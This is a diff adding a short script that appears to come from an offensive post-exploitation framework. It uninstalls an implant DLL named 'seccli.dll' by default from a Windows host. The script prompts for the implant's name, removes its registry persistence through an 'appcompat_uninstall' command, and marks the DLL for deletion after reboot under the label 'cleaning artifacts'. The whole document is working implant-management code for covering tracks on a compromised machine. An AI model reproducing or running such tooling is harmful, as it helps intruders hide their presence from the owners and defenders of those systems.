@@ -1,0 +1,63 @@
+
+@include "_File.dsi";
+@include "_Paths.dsi";
+@include "windows/_RegistryIncludes.dsi";
+@echo off;
+@disablewow64 on;
+
+if ($argc != 1)
+{
+	echo("* Invalid parmeters", ERROR);
+	echo();
+	echo("Usage: $argv[0]");
+	return false;
+}
+
+# get install name
+string $payloadName = "seccli.dll";
+if (!GetInput("PC DLL install name", $payloadName, $payloadName))
+{
+	echo("* Failed to get install name", ERROR);
+	return false;
+}
+
+# get the system path
+string $sysPath;
+if (!_GetSystemPath($sysPath))
+{
+	echo("* Failed to get system path", ERROR);
+	return false;
+}
+
+# make sure the file exists
+if (!_FileExists($payloadName, $syspath))
+{
+	echo("* Failed to find $syspath\\$payloadName", ERROR);
+	return false;
+}
+
+echo "cleaning artifacts";
+# Finalize uninstall (undo persistence in registry)
+if (!`appcompat_uninstall -remotelibname "$payloadName"`)
+{
+	echo("    FAILED", ERROR);
+}
+else
+{
+	echo("    REGISTRY CLEAN AND DB REMOVED", GOOD);
+}
+
+echo "Deleting PC";
+if (!`delete -file "$sysPath\\$payloadName" -afterreboot`)
+{
+	echo("    FAILED", ERROR);
+}
+else
+{
+	echo("    MARKED FOR DELETION", GOOD);
+}
+
+echo "Uninstall Finished";
+
+pause;
+return true;
